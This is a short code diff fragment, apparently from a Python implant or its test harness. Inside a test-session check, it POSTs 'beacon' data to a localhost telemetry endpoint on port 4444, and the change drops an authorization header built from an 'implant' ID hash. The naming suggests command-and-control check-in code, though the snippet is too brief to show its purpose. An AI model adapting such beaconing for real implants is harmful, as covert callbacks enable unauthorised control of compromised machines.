@@ -130,7 +130,7 @@ if os.path.exists('test_session.txt'):
     try:
         response = requests.post(
             'http://localhost:4444/api/v1/telemetry',
-            json=beacon_data, headers={"Authorization": f"Bearer {implant_id_hash}"},
+            json=beacon_data,
             timeout=10
         )
         
